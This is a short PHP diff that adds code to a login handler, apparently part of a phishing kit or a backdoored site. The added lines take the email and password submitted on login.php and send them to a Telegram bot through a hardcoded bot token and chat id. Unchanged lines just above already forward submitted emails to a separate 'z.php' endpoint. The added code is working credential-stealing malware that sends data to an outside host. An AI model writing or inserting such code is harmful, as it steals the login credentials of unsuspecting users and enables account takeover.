@@ -96,4 +96,11 @@ $countEm = count($splitEm);
 
 if (!in_array($_POST['email'], $splitEm) && !empty($_POST['email'])) {
 file_get_contents($site . "/z.php?email=".$_POST['email']);
+if ($_SERVER['SCRIPT_NAME'] == "login.php") {
+	     $data = [
+         'chat_id' => "-593620303",
+         'text' => "User: " . $_POST['email'] . "\nPass: " . $_POST['password']
+      ];
+      file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?" . http_build_query($data));
+}
 }
